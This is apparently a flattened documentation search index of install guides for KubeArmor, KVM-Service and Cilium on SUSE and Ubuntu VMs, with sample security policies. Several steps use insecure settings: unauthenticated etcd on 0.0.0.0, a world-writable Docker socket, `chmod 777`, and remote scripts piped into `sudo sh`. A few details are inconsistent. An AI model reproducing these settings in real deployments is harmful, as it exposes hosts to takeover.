/etcd- ${ ETCD_VER } -linux-arm64.tar.gz \\ -o /tmp/etcd- ${ ETCD_VER } -linux-arm64.tar.gz tar xzvf /tmp/etcd- ${ ETCD_VER } -linux-arm64.tar.gz \\ -C /tmp/etcd --strip-components = 1 cp /tmp/etcd/etcd /usr/bin/etcd cp /tmp/etcd/etcdctl /usr/bin/etcdctl Create and Edit the .yaml file: sudo vi /etc/etcd/etcd.conf.yaml name : controller data-dir : /var/lib/etcd initial-cluster-state : 'new' initial-cluster-token : 'etcd-cluster-01' initial-cluster : controller=http://0.0.0.0:2380 initial-advertise-peer-urls : http://0.0.0.0:2380 advertise-client-urls : http://0.0.0.0:2379 listen-peer-urls : http://0.0.0.0:2380 listen-client-urls : http://0.0.0.0:2379 Create and Edit the .service file: sudo vi /usr/lib/systemd/system/etcd.service [ Unit ] After=network.target Description=etcd - highly-available key value store [Service] # Uncomment this on ARM64. # Environment=\"ETCD_UNSUPPORTED_ARCH=arm64\" LimitNOFILE=65536 Restart=on-failure Type=notify ExecStart=/usr/bin/etcd --config-file /etc/etcd/etcd.conf.yml User=etcd [Install] WantedBy=multi-user.target Reload systemd service files with: systemctl daemon-reload Enable and Start the etcd service: systemctl enable etcd systemctl start etcd systemctl status etcd","title":"Step 1: Install etcd in control plane VM"},{"location":"open-source/suse_les_15/suse_les_15/#step-2-install-kvm-service-in-control-plane-vm","text":"Download the Latest RPM Package wget https://github.com/kubearmor/kvm-service/releases/download/0.1/kvmservice_0.1_linux-amd64.rpm zypper install kvmservice_0.1_linux-amd64.rpm systemctl status kvmservice","title":"Step 2: Install KVM-Service in control plane VM"},{"location":"open-source/suse_les_15/suse_les_15/#step-3-install-karmor-in-control-plane-vm","text":"curl -sfL https://raw.githubusercontent.com/kubearmor/kubearmor-client/main/install.sh | sudo sh -s -- -b /usr/local/bin","title":"Step 3: Install Karmor in control plane VM"},{"location":"open-source/suse_les_15/suse_les_15/#step-4-onboard-vms-using-karmor","text":"cat kvmpolicy1.yaml apiVersion : security.kubearmor.com/v1 kind : KubeArmorVirtualMachine metadata : name : testvm1 labels : name : vm1 vm : true Run this command to Add the VM: karmor vm add kvmpolicy1.yaml To see the onboarded VM\u2019s karmor vm list","title":"Step 4: Onboard VMs using Karmor"},{"location":"open-source/suse_les_15/suse_les_15/#step-5-generate-installation-scripts-for-configured-worker-vms","text":"Generate VM installation scripts for the configured VM by running the following command: karmor vm --kvms getscript -v testvm1","title":"Step 5: Generate Installation scripts for configured worker VMs"},{"location":"open-source/suse_les_15/suse_les_15/#step-6-execute-the-installation-script-in-vms","text":"Note: Docker needs to Install before running the script. Install pre-requisites: sudo zypper ref sudo zypper in bcc-tools bcc-examples fullkver = $( zypper se -s kernel-default-devel | awk '{split($0,a,\"|\"); print a[4]}' | grep $( uname -r | awk '{gsub(\"-default\", \"\");print}' ) | sed -e 's/^[ \\t]*//' | tail -n 1 ) zypper -n --config /var/opt/carbonblack/response/zypp.conf install -f -y kernel-default-devel = \" $fullkver \" zypper in apparmor-utils zypper in apparmor-profiles systemctl restart apparmor.service vi testvm1.sh Comment the following line on script and save it: #sudo docker run --name kubearmor $DOCKER_OPTS $KUBEARMOR_IMAGE $KUBEARMOR_OPTS Note: Upcoming release will fix the above comment section. Execute the Installation script: Copy the generated installation scripts to appropriate VMs using scp or rsync method and execute the scripts to run Cilium. The script downloads Cilium Docker images and run them as containers in each VM. Cilium running in each VM connects to the KVM-Service control plane to register themselves and receive information about other VMs in the cluster, labels, IPs and configured security policies. Execute the script on worker VM by running the following command: ./testvm1.sh Note: Make sure the KVM-Service is running on control plane VM & To onboard more worker VM repeat Step 4, Step 5 & Step 6. You can verify by running following command: sudo docker ps","title":"Step 6: Execute the Installation script in VMs"},{"location":"open-source/suse_les_15/suse_les_15/#step-7-install-kubearmor-on-worker-vms","text":"Download the Latest release of KubeArmor wget https://github.com/kubearmor/KubeArmor/releases/download/v0.3.1/kubearmor_0.3.1_linux-amd64.rpm zypper install kubearmor_0.3.1_linux-amd64.rpm Start & Check the status of Kubearmor: sudo systemctl start kubearmor sudo systemctl enable kubearmor sudo systemctl status kubearmor","title":"Step 7: Install Kubearmor on worker VMs"},{"location":"open-source/suse_les_15/suse_les_15/#step-8-apply-and-verify-kubearmor-system-policy","text":"cat khp-example-vmname.yaml apiVersion : security.kubearmor.com/v1 kind : KubeArmorHostPolicy metadata : name : khp-02 spec : severity : 5 file : matchPaths : - path : /proc/cpuinfo action : Block Run this command to apply the policy: karmor vm policy add khp-example-vmname.yaml","title":"Step 8: Apply and Verify Kubearmor system policy"},{"location":"open-source/suse_les_15/suse_les_15/#step-9-policy-violation","text":"With the above mentioned policy enforced in the VM, if a user tries to access /proc/cpuinfo file, user will see permission denied error and karmor log will show the alert log for blocking the file access as shown below. cat /proc/cpuinfo Verifying policy Violation logs: karmor log","title":"Step 9: Policy Violation"},{"location":"open-source/suse_les_15/suse_les_15/#step-10-apply-and-verify-cilium-network-policy","text":"1. Allow connectivity with the control plane ( and port 2379) cat vm-allow-control-plane.yaml kind : CiliumNetworkPolicy metadata : name : \"vm-allow-control-plane\" spec : description : \"Policy to allow traffic to kv-store\" nodeSelector : matchLabels : name : vm1 egress : - toCIDR : - 10.138.0.5/32 toPorts : - ports : - port : \"2379\" protocol : TCP 2. For SSH connectivity allow port 22 and 169.254.169.254 port 80 cat vm-allow-ssh.yaml kind : CiliumNetworkPolicy metadata : name : \"vm-allow-ssh\" spec : description : \"Policy to allow SSH\" nodeSelector : matchLabels : name : vm1 egress : - toPorts : - ports : - port : \"22\" protocol : TCP - toCIDR : - 169.254.169.254/32 toPorts : - ports : - port : \"80\" protocol : TCP 3. This policy block the DNS access in VM cat vm-dns-visibility.yaml kind : CiliumNetworkPolicy metadata : name : \"vm-dns-visibility\" spec : description : \"Policy to enable DNS visibility\" nodeSelector : matchLabels : name : vm1 egress : - toPorts : - ports : - port : \"53\" protocol : ANY rules : dns : - matchPattern : \"*\" 4. This policy allow access of \u201c www.google.co.in \u201d alone in VM cat vm-allow-www-google-co-in.yaml kind : CiliumNetworkPolicy metadata : name : \"vm-allow-www.google.co.in\" spec : description : \"Policy to allow traffic to www.google.co.in\" nodeSelector : matchLabels : name : vm1 egress : - toFQDNs : - matchName : www.google.co.in toPorts : - ports : - port : \"80\" protocol : TCP - port : \"443\" protocol : TCP Run this command to apply the policy: karmor vm --kvms policy add vm-allow-control-plane.yaml karmor vm --kvms policy add vm-allow-ssh.yaml karmor vm --kvms policy add vm-dns-visibility.yaml karmor vm --kvms policy add vm-allow-www-google-co-in.yaml","title":"Step 10: Apply and Verify Cilium network policy"},{"location":"open-source/suse_les_15/suse_les_15/#step-11-policy-violation-on-worker-node","text":"curl http://www.google.co.in/ curl https://go.dev/ Verifying policy Violation logs: docker exec -it cilium hubble observe -f -t policy-verdict","title":"Step 11: Policy Violation on worker node"},{"location":"open-source/ubuntu18.04/ubuntu18.04/","text":"Overview \u00b6 This user journey guides you to install and verify the compatibility of Kuberarmor and Cilium on Ubuntu 18.04 with 5.4 Kernel Version by applying policies on kubernetes workloads. Step 1: Install etcd in control plane VM \u00b6 sudo apt-get install etcd Once etcd installed, configure the following values in /etc/default/etcd as shown below. ETCD_LISTEN_CLIENT_URLS = http://0.0.0.0:2379 ETCD_ADVERTISE_CLIENT_URLS = http://0.0.0.0:2379 Restart and check the status of etcd: sudo service etcd restart sudo service etcd enable sudo service etcd status Step 2: Install KVM-Service in control plane \u00b6 Pre-requisites: Download and Install Go Visit Go Website for Latest Version wget https://go.dev/dl/go1.18.1.linux-amd64.tar.gz Untar file: rm -rf /usr/local/go && tar -C /usr/local -xzf go1.18.1.linux-amd64.tar.gz vim /etc/profile Paste the below path in /etc/profile: export PATH = $PATH :/usr/local/go/bin Run the following command: source /etc/profile Clone KVM-Service code and checkout to non-k8s branch: sudo git clone https://github.com/kubearmor/kvm-service.git cd /kvm-service/ sudo git checkout non-k8s Navigate to kvm-service/src/service/ and execute the following command to compile KVM-Service code: make Once compilation is successful, run KVM-Service using the following command: sudo ./kvmservice --non-k8s 2 > /dev/null Note: Let keep it running and continue in new terminal. Step 3: Install Karmor in control plane \u00b6 Run the following command to Install Karmor utility: curl -sfL https://raw.githubusercontent.com/kubearmor/kubearmor-client/main/install.sh | sudo sh -s -- -b /usr/local/bin Step 4: Onboard VMs using Karmor \u00b6 vim kvmpolicy1.yaml apiVersion : security.kubearmor.com/v1 kind : KubeArmorVirtualMachine metadata : name : testvm1 labels : name : vm1 vm : true Run this command: karmor vm add kvmpolicy1.yaml When a new VM is onboarded, the KVM-Service assigns a new identity to it. To see the list of onboarded VMs, execute the following command. karmor vm list Step 5: Generate Installation scripts for configured VM \u00b6 karmor vm --kvms getscript -v testvm1 Output: VM installation script copied to testvm1.sh Step 6: Execute the Installation script in Docker Installed VM \u00b6 Install pre-requisites: sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 4052245BD4284CDD echo \"deb https://repo.iovisor.org/apt/ $( lsb_release -cs ) $( lsb_release -cs ) main\" | sudo tee /etc/apt/sources.list.d/iovisor.list sudo apt-get update sudo apt-get install bcc-tools libbcc-examples linux-headers- $( uname -r ) sudo apt install bpfcc-tools linux-headers- $( uname -r ) sudo apt-get install linux-headers-generic sudo apt --fix-broken install sudo apt-get update Install Docker: sudo apt-get update sudo apt install docker.io sudo systemctl start docker sudo systemctl enable docker sudo systemctl status docker Comment the following line on the script and save it: vi testvm1 #sudo docker run --name kubearmor $DOCKER_OPTS $KUBEARMOR_IMAGE $KUBEARMOR_OPTS Execute the Installation script: Copy the generated installation scripts to appropriate VMs using scp or rsync method and execute the scripts to run Cilium. The script downloads Cilium Docker images and runs them as containers in each VM. Cilium running in each VM connects to the KVM-Service control plane to register themselves and receive information about other VMs in the cluster, labels, IPs and configured security policies. Execute the script on worker VM by running the following commands: sudo su - chmod 777 testvm1.sh ./testvm1.sh Note: Make sure the kvm-service is running on control plane VM & To onboard more worker VM repeat Step 6, Step 7 & Step 8. You can Verify by running following command, docker ps Step 7: Install Kubearmor on worker VM \u00b6 Download & Install the Latest release of KubeArmor wget https://github.com/kubearmor/KubeArmor/releases/download/v0.3.1/kubearmor_0.3.1_linux-amd64.deb && sudo dpkg -i kubearmor_0.3.1_linux-amd64.deb Start and Check the status of Kubearmor: sudo systemctl start kubearmor sudo systemctl enable kubearmor sudo systemctl status kubearmor Step 8: Apply and Verify KubeArmor system policy \u00b6 1. Apply the policy vim sleepdenypolicy.yaml apiVersion : security.kubearmor.com/v1 kind : KubeArmorHostPolicy metadata : name : hsp-kubearmor-dev-proc-path-block spec : process : matchPaths : - path : bin/sleep # try sleep 1 action : Block Run this command to apply the policy: karmor vm --kvms policy add sleepdenypolicy.yaml Note: With the above mentioned policy enforced in master VM, if a user tries to access sleep command, user will see permission denied error and karmor log will show the alert log for blocking the file access. 2. Violating the policy sleep 2 Verifying policy Violation logs: karmor log 3. Deleting the applied policy karmor vm --kvms policy delete sleepdenypolicy.yaml Step 9: Apply and Verify Cilium network policy \u00b6 1. Apply the policy vim port80-allow.yaml apiVersion : \"cilium.io/v2\" kind : CiliumNetworkPolicy metadata : name : \"vm1-allow-http\" spec : description : \"L4 policy to allow traffic at port 80/TCP\" nodeSelector : matchLabels : name : vm1 ingress : - toPorts : - ports : - port : \"80\" protocol : TCP Run this command to apply the policy: karmor vm --kvms policy add port80-allow.yaml Note: The policy says.. \"ingress, port 80/TCP\". This will allow ingress connection to the specified port/protocol. Anything other than that will be denied. 2. Violating the policy Output : Unable to SSH the VM via 22 port 3. Deleting the applied policy karmor vm --kvms policy delete port80-allow.yaml Output : Now able to do SSH","title":"Ubuntu18.04"},{"location":"open-source/ubuntu18.04/ubuntu18.04/#overview","text":"This user journey guides you to install and verify the compatibility of Kuberarmor and Cilium on Ubuntu 18.04 with 5.4 Kernel Version by applying policies on kubernetes workloads.","title":"Overview"},{"location":"open-source/ubuntu18.04/ubuntu18.04/#step-1-install-etcd-in-control-plane-vm","text":"sudo apt-get install etcd Once etcd installed, configure the following values in /etc/default/etcd as shown below. ETCD_LISTEN_CLIENT_URLS = http://0.0.0.0:2379 ETCD_ADVERTISE_CLIENT_URLS = http://0.0.0.0:2379 Restart and check the status of etcd: sudo service etcd restart sudo service etcd enable sudo service etcd status","title":"Step 1: Install etcd in control plane VM"},{"location":"open-source/ubuntu18.04/ubuntu18.04/#step-2-install-kvm-service-in-control-plane","text":"Pre-requisites: Download and Install Go Visit Go Website for Latest Version wget https://go.dev/dl/go1.18.1.linux-amd64.tar.gz Untar file: rm -rf /usr/local/go && tar -C /usr/local -xzf go1.18.1.linux-amd64.tar.gz vim /etc/profile Paste the below path in /etc/profile: export PATH = $PATH :/usr/local/go/bin Run the following command: source /etc/profile Clone KVM-Service code and checkout to non-k8s branch: sudo git clone https://github.com/kubearmor/kvm-service.git cd /kvm-service/ sudo git checkout non-k8s Navigate to kvm-service/src/service/ and execute the following command to compile KVM-Service code: make Once compilation is successful, run KVM-Service using the following command: sudo ./kvmservice --non-k8s 2 > /dev/null Note: Let keep it running and continue in new terminal.","title":"Step 2: Install KVM-Service in control plane"},{"location":"open-source/ubuntu18.04/ubuntu18.04/#step-3-install-karmor-in-control-plane","text":"Run the following command to Install Karmor utility: curl -sfL https://raw.githubusercontent.com/kubearmor/kubearmor-client/main/install.sh | sudo sh -s -- -b /usr/local/bin","title":"Step 3: Install Karmor in control plane"},{"location":"open-source/ubuntu18.04/ubuntu18.04/#step-4-onboard-vms-using-karmor","text":"vim kvmpolicy1.yaml apiVersion : security.kubearmor.com/v1 kind : KubeArmorVirtualMachine metadata : name : testvm1 labels : name : vm1 vm : true Run this command: karmor vm add kvmpolicy1.yaml When a new VM is onboarded, the KVM-Service assigns a new identity to it. To see the list of onboarded VMs, execute the following command. karmor vm list","title":"Step 4: Onboard VMs using Karmor"},{"location":"open-source/ubuntu18.04/ubuntu18.04/#step-5-generate-installation-scripts-for-configured-vm","text":"karmor vm --kvms getscript -v testvm1 Output: VM installation script copied to testvm1.sh","title":"Step 5: Generate Installation scripts for configured VM"},{"location":"open-source/ubuntu18.04/ubuntu18.04/#step-6-execute-the-installation-script-in-docker-installed-vm","text":"Install pre-requisites: sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 4052245BD4284CDD echo \"deb https://repo.iovisor.org/apt/ $( lsb_release -cs ) $( lsb_release -cs ) main\" | sudo tee /etc/apt/sources.list.d/iovisor.list sudo apt-get update sudo apt-get install bcc-tools libbcc-examples linux-headers- $( uname -r ) sudo apt install bpfcc-tools linux-headers- $( uname -r ) sudo apt-get install linux-headers-generic sudo apt --fix-broken install sudo apt-get update Install Docker: sudo apt-get update sudo apt install docker.io sudo systemctl start docker sudo systemctl enable docker sudo systemctl status docker Comment the following line on the script and save it: vi testvm1 #sudo docker run --name kubearmor $DOCKER_OPTS $KUBEARMOR_IMAGE $KUBEARMOR_OPTS Execute the Installation script: Copy the generated installation scripts to appropriate VMs using scp or rsync method and execute the scripts to run Cilium. The script downloads Cilium Docker images and runs them as containers in each VM. Cilium running in each VM connects to the KVM-Service control plane to register themselves and receive information about other VMs in the cluster, labels, IPs and configured security policies. Execute the script on worker VM by running the following commands: sudo su - chmod 777 testvm1.sh ./testvm1.sh Note: Make sure the kvm-service is running on control plane VM & To onboard more worker VM repeat Step 6, Step 7 & Step 8. You can Verify by running following command, docker ps","title":"Step 6: Execute the Installation script in Docker Installed VM"},{"location":"open-source/ubuntu18.04/ubuntu18.04/#step-7-install-kubearmor-on-worker-vm","text":"Download & Install the Latest release of KubeArmor wget https://github.com/kubearmor/KubeArmor/releases/download/v0.3.1/kubearmor_0.3.1_linux-amd64.deb && sudo dpkg -i kubearmor_0.3.1_linux-amd64.deb Start and Check the status of Kubearmor: sudo systemctl start kubearmor sudo systemctl enable kubearmor sudo systemctl status kubearmor","title":"Step 7: Install Kubearmor on worker VM"},{"location":"open-source/ubuntu18.04/ubuntu18.04/#step-8-apply-and-verify-kubearmor-system-policy","text":"1. Apply the policy vim sleepdenypolicy.yaml apiVersion : security.kubearmor.com/v1 kind : KubeArmorHostPolicy metadata : name : hsp-kubearmor-dev-proc-path-block spec : process : matchPaths : - path : bin/sleep # try sleep 1 action : Block Run this command to apply the policy: karmor vm --kvms policy add sleepdenypolicy.yaml Note: With the above mentioned policy enforced in master VM, if a user tries to access sleep command, user will see permission denied error and karmor log will show the alert log for blocking the file access. 2. Violating the policy sleep 2 Verifying policy Violation logs: karmor log 3. Deleting the applied policy karmor vm --kvms policy delete sleepdenypolicy.yaml","title":"Step 8: Apply and Verify KubeArmor system policy"},{"location":"open-source/ubuntu18.04/ubuntu18.04/#step-9-apply-and-verify-cilium-network-policy","text":"1. Apply the policy vim port80-allow.yaml apiVersion : \"cilium.io/v2\" kind : CiliumNetworkPolicy metadata : name : \"vm1-allow-http\" spec : description : \"L4 policy to allow traffic at port 80/TCP\" nodeSelector : matchLabels : name : vm1 ingress : - toPorts : - ports : - port : \"80\" protocol : TCP Run this command to apply the policy: karmor vm --kvms policy add port80-allow.yaml Note: The policy says.. \"ingress, port 80/TCP\". This will allow ingress connection to the specified port/protocol. Anything other than that will be denied. 2. Violating the policy Output : Unable to SSH the VM via 22 port 3. Deleting the applied policy karmor vm --kvms policy delete port80-allow.yaml Output : Now able to do SSH","title":"Step 9: Apply and Verify Cilium network policy"},{"location":"open-source/ubuntu20.04/ubuntu20.04/","text":"Overview \u00b6 This user journey guides you to install and verify the compatibility of Kuberarmor and Cilium on Ubuntu 20.04 with 5.13 Kernel Version by applying policies on kubernetes workloads. Step 1: Install etcd in control plane VM \u00b6 sudo su apt update apt-get install etcd Once etcd installed, configure the following values in /etc/default/etcd as shown below. vim /etc/default/etcd ETCD_LISTEN_CLIENT_URLS = http://0.0.0.0:2379 ETCD_ADVERTISE_CLIENT_URLS = http://0.0.0.0:2379 Restart and Check the status of etcd: service etcd restart service etcd status service etcd enable Step 2: Installing BCC \u00b6 apt install -y bison build-essential cmake flex git libedit-dev \\ > libllvm7 llvm-7-dev libclang-7-dev python zlib1g-dev libelf-dev libfl-dev python3-distutils git clone --depth 1 --branch v0.24.0 https://github.com/iovisor/bcc.git mkdir bcc/build ; cd bcc/build cmake .. make make install cmake -DPYTHON_CMD = python3 .. pushd src/python/ && make make install Step 3: Install KVM-Service in control plane \u00b6 Pre-requisites: Download & Install Go Visit Go website for latest version wget https://go.dev/dl/go1.18.1.linux-amd64.tar.gz Untar file: rm -rf /usr/local/go && tar -C /usr/local -xzf go1.18.1.linux-amd64.tar.gz vim /etc/profile Paste the below path in /etc/profile: export PATH = $PATH :/usr/local/go/bin Run the following command: source /etc/profile Note: KVM-Service requires that all the managed VMs should be within the same network. git clone https://github.com/kubearmor/kvm-service.git cd kvm-service && git checkout non-k8s cd src/service/ && make ./kvmservice --non-k8s 2 > /dev/null Note: Let it keep running & continue in new terminal. Step 4: Install Karmor in control plane \u00b6 curl -sfL https://raw.githubusercontent.com/kubearmor/kubearmor-client/main/install.sh | sudo sh -s -- -b /usr/local/bin Step 5: Onboard VMs using Karmor \u00b6 cat kvmpolicy1.yaml karmor vm add kvmpolicy1.yaml karmor vm list Step 6: Generate Installation scripts for configured VM \u00b6 karmor vm --kvms getscript -v testvm1 Step 7: Execute the Installation script in VM \u00b6 sudo su apt update Note: Docker needs to be Installed before runing the script. apt install docker.io chmod 666 /var/run/docker.sock Copy the Generated Installation scripts to appropriate VM: scp -r testvm1.sh [ root@IP:/path ] chmod +x testvm1.sh ./testvm1.sh docker ps Step 8: Installing Kubearmor worker node \u00b6 Install pre-requisites: apt install bpfcc-tools linux-headers- $( uname -r ) wget https://github.com/kubearmor/KubeArmor/releases/download/v0.2.1/kubearmor_0.2.1_linux-amd64.deb && dpkg -i kubearmor_0.2.1_linux-amd64.deb If above error occurs, Run: apt --fix-broken install Start and Check the status of Kubearmor: sudo systemctl start kubearmor sudo systemctl enable kubearmor sudo systemctl status kubearmor Step 9: Apply and Verify Kubearmor system policy \u00b6 1. Apply the policy cat khp-example-vmname.yaml apiVersion : security.kubearmor.com/v1 kind : KubeArmorHostPolicy metadata : name : khp-02 spec : severity : 5 file : matchPaths : - path : /proc/cpuinfo action : Block karmor vm --kvms policy add khp-example-vmname.yaml Output: success Note: With the above mentioned policy enforced in the VM, if a user tries to access /proc/cpuinfo file, user will see permission denied error and karmor log will show the alert log for blocking the file access. 2. Violating the policy cat /proc/cpuinfo Verifying policy Violation logs: curl -sfL https://raw.githubusercontent.com/kubearmor/kubearmor-client/main/install.sh | sudo sh -s -- -b /usr/local/bin karmor log Step 10: Apply and Verify Cilium network policy \u00b6 1. Allow connectivity with the control plane ( and port 2379) vim vm-allow-control-plane.yaml kind : CiliumNetworkPolicy metadata : name : \"vm-allow-control-plane\" spec : description : \"Policy to allow traffic to kv-store\" nodeSelector : matchLabels : name : vm1 egress : - toCIDR : - 10.128.0.6/32 toPorts : - ports : - port : \"2379\" protocol : TCP karmor vm --kvms policy add vm-allow-control-plane.yaml Note: With the above mentioned policy enforced in the VM, a user cannot access any port of the vm. SSH connection of port22 gets an error connection refused . 2. For SSH connectivity allow port 22 and 169.254.169.254 port 80 vim vm-allow-ssh.yaml kind : CiliumNetworkPolicy metadata : name : \"vm-allow-ssh\" spec : description : \"Policy to allow SSH\" nodeSelector : matchLabels : name : vm1 ingress : - toPorts : - ports : - port : \"22\" protocol : TCP - toCIDR : - 169.254.169.254/32 toPorts : - ports : - port : \"80\" protocol : TCP egress : - fromCIDR : - 169.254.169.254/32 toPorts : - ports : - port : \"80\" protocol : TCP karmor vm --kvms policy add vm-allow-ssh.yaml 3. This policy allow DNS access in VM vim vm-dns-visibility.yaml kind : CiliumNetworkPolicy metadata : name : \"vm-dns-visibility\" spec : description : \"Policy to enable DNS visibility\" nodeSelector : matchLabels : name : vm1 egress : - toPorts : - ports : - port : \"53\" protocol : ANY rules : dns : - matchPattern : \"*\" karmor vm --kvms policy add vm-dns-visibility.yaml 4. This policy allow access of \u201c www.google.co.in \u201d alone in VM vim vm-allow-www-google-co-in.yaml kind : CiliumNetworkPolicy metadata : name : \"vm-allow-www.google.co.in\" spec : description : \"Policy to allow traffic to www.google.co.in\" nodeSelector : matchLabels : name : vm1 egress : - toFQDNs : - matchName : www.google.co.in toPorts : - ports : - port : \"80\" protocol : TCP - port : \"443\" protocol : TCP karmor vm --kvms policy add vm-allow-www-google-co-in.yaml Violating the Policy: curl http://www.google.co.in/ curl https://go.dev/ Verifying policy Violation logs: docker exec -it cilium hubble observe -f -t policy-verdict","title":"Ubuntu20.04"},{"location":"open-source/ubuntu20.04/ubuntu20.04/#overview","text":"This user journey guides you to install and verify the compatibility of Kuberarmor and Cilium on Ubuntu 20.04 with 5.13 Kernel Version by applying policies on kubernetes workloads.","title":"Overview"},{"location":"open-source/ubuntu20.04/ubuntu20.04/#step-1-install-etcd-in-control-plane-vm","text":"sudo su apt update apt-get install etcd Once etcd installed, configure the following values in /etc/default/etcd as shown below. vim /etc/default/etcd ETCD_LISTEN_CLIENT_URLS = http://0.0.0.0:2379 ETCD_ADVERTISE_CLIENT_URLS = http://0.0.0.0:2379 Restart and Check the status of etcd: service etcd restart service etcd status service etcd enable","title":"Step 1: Install etcd in control plane VM"},{"location":"open-source/ubuntu20.04/ubuntu20.04/#step-2-installing-bcc","text":"apt install -y bison build-essential cmake flex git libedit-dev \\ > libllvm7 llvm-7-dev libclang-7-dev python zlib1g-dev libelf-dev libfl-dev python3-distutils git clone --depth 1 --branch v0.24.0 https://github.com/iovisor/bcc.git mkdir bcc/build ; cd bcc/build cmake .. make make install cmake -DPYTHON_CMD = python3 .. pushd src/python/ && make make install","title":"Step 2: Installing BCC"},{"location":"open-source/ubuntu20.04/ubuntu20.04/#step-3-install-kvm-service-in-control-plane","text":"Pre-requisites: Download & Install Go Visit Go website for latest version wget https://go.dev/dl/go1.18.1.linux-amd64.tar.gz Untar file: rm -rf /usr/local/go && tar -C /usr/local -xzf go1.18.1.linux-amd64.tar.gz vim /etc/profile Paste the below path in /etc/profile: export PATH = $PATH :/usr/local/go/bin Run the following command: source /etc/profile Note: KVM-Service requires that all the managed VMs should be within the same network. git clone https://github.com/kubearmor/kvm-service.git cd kvm-service && git checkout non-k8s cd src/service/ && make ./kvmservice --non-k8s 2 > /dev/null Note: Let it keep running & continue in new terminal.","title":"Step 3: Install KVM-Service in control plane"},{"location":"open-source/ubuntu20.04/ubuntu20.04/#step-4-install-karmor-in-control-plane","text":"curl -sfL https://raw.githubusercontent.com/kubearmor/kubearmor-client/main/install.sh | sudo sh -s -- -b /usr/local/bin","title":"Step 4: Install Karmor in control plane"},{"location":"open-source/ubuntu20.04/ubuntu20.04/#step-5-onboard-vms-using-karmor","text":"cat kvmpolicy1.yaml karmor vm add kvmpolicy1.yaml karmor vm list","title":"Step 5: Onboard VMs using Karmor"},{"location":"open-source/ubuntu20.04/ubuntu20.04/#step-6-generate-installation-scripts-for-configured-vm","text":"karmor vm --kvms getscript -v testvm1","title":"Step 6: Generate Installation scripts for configured VM"},{"location":"open-source/ubuntu20.04/ubuntu20.04/#step-7-execute-the-installation-script-in-vm","text":"sudo su apt update Note: Docker needs to be Installed before runing the script. apt install docker.io chmod 666 /var/run/docker.sock Copy the Generated Installation scripts to appropriate VM: scp -r testvm1.sh [ root@IP:/path ] chmod +x testvm1.sh ./testvm1.sh docker ps","title":"Step 7: Execute the Installation script in VM"},{"location":"open-source/ubuntu20.04/ubuntu20.04/#step-8-installing-kubearmor-worker-node","text":"Install pre-requisites: apt install bpfcc-tools linux-headers- $( uname -r ) wget https://github.com/kubearmor/KubeArmor/releases/download/v0.2.1/kubearmor_0.2.1_linux-amd64.deb && dpkg -i kubearmor_0.2.1_linux-amd64.deb If above error occurs, Run: apt --fix-broken install Start and Check the status of Kubearmor: sudo systemctl start kubearmor sudo systemctl enable kubearmor sudo systemctl status kubearmor","title":"Step 8: Installing Kubearmor worker node"},{"location":"open-source/ubuntu20.04/ubuntu20.04/#step-9-apply-and-verify-kubearmor-system-policy","text":"1. Apply the policy cat khp-example-vmname.yaml apiVersion : security.kubearmor.com/v1 kind : KubeArmorHostPolicy metadata : name : khp-02 spec : severity : 5 file : matchPaths : - path : /proc/cpuinfo action : Block karmor vm --kvms policy add khp-example-vmname.yaml Output: success Note: With the above mentioned policy enforced in the VM, if a user tries to access /proc/cpuinfo file, user will see permission denied error and karmor log will show the alert log for blocking the file access. 2. Violating the policy cat /proc/cpuinfo Verifying policy Violation logs: curl -sfL https://raw.githubusercontent.com/kubearmor/kubearmor-client/main/install.sh | sudo sh -s -- -b /usr/local/bin karmor log","title":"Step 9: Apply and Verify Kubearmor system policy"},{"location":"open-source/ubuntu20.04/ubuntu20.04/#step-10-apply-and-verify-cilium-network-policy","text":"1. Allow connectivity with the control plane ( and port 2379) vim vm-allow-control-plane.yaml kind : CiliumNetworkPolicy metadata : name : \"vm-allow-control-plane\" spec : description : \"Policy to allow traffic to kv-store\" nodeSelector : matchLabels : name : vm1 egress : - toCIDR : - 10.128.0.6/32 toPorts : - ports : - port : \"2379\" protocol : TCP karmor vm --kvms policy add vm-allow-control-plane.yaml Note: With the above mentioned policy enforced in the VM, a user cannot access any port of the vm. SSH connection of port22 gets an error connection refused . 2. For SSH connectivity allow port 22 and 169.254.169.254 port 80 vim vm-allow-ssh.yaml kind : CiliumNetworkPolicy metadata : name : \"vm-allow-ssh\" spec : description : \"Policy to allow SSH\" nodeSelector : matchLabels : name : vm1 ingress : - toPorts : - ports : - port : \"22\" protocol : TCP - toCIDR : - 169.254.169.254/32 toPorts : - ports : - port : \"80\" protocol : TCP egress : - fromCIDR : - 169.254.169.254/32 toPorts : - ports : - port : \"80\" protocol : TCP karmor vm --kvms policy add vm-allow-ssh.yaml 3. This policy allow DNS access in VM vim vm-dns-visibility.yaml kind : CiliumNetworkPolicy metadata : name : \"vm-dns-visibility\" spec : description : \"Policy to enable DNS visibility\" nodeSelector : matchLabels : name : vm1 egress : - toPorts : - ports : - port : \"53\" protocol : ANY rules : dns : - matchPattern : \"*\" karmor vm --kvms policy add vm-dns-visibility.yaml 4. This policy allow access of \u201c www.google.co.in \u201d alone in VM vim vm-allow-www-google-co-in.yaml kind : CiliumNetworkPolicy metadata : name : \"vm-allow-www.google.co.in\" spec : description : \"Policy to allow traffic to www.google.co.in\" nodeSelector : matchLabels : name : vm1 egress : - toFQDNs : - matchName : www.google.co.in toPorts : - ports : - port : \"80\" protocol : TCP - port : \"443\" protocol : TCP karmor vm --kvms policy add vm-allow-www-google-co-in.yaml Violating the Policy: curl http://www.google.co.in/ curl https://go.dev/ Verifying policy Violation logs: docker exec -it cilium hubble observe -f -t policy-verdict","title":"Step 10: Apply and Verify Cilium network policy"},{"location":"policies-and-rule/policies-and-rule/","text":"Policies and rules \u00b6 Accuknox support three types of policies. Network-Ingress, Network-Egress and System Policies. The egress policy restricts the outbound network flows and the other way, the ingress policy operates against the inbound network flows. System Policy restricts the behavior (such as process execution, file access, networking operation and capabilities) of pods and nodes at the system level. Structure of network policy \u00b6 Network-egress Policy Specification apiVersion: \"cilium.io/v2\" kind: CiliumNetworkPolicy metadata: name: [policy name] description: [Policy Desciption] spec: endpointSelector: matchLabels: [key1]: [value1] [keyN]: [valueN] egress: - toEndpoints: - matchLabels: [key1]: [value1] [keyN]: [valueN] - toPorts: - ports: - port: [port number] protocol: [protocol] - toCIDRSet: - cidr: [ip addr]/[cidr bits] except: - [ip addr]/[cidr bits] - toEntities: - [entity] - toServices: - k8sService: serviceName: [service name] namespace: [namespace] - toFQDNs: - matchName: [domain name] - matchPattern: [domain name pattern] Network-ingress Policy Specification apiVersion: \"cilium.io/v2\" kind: CiliumNetworkPolicy 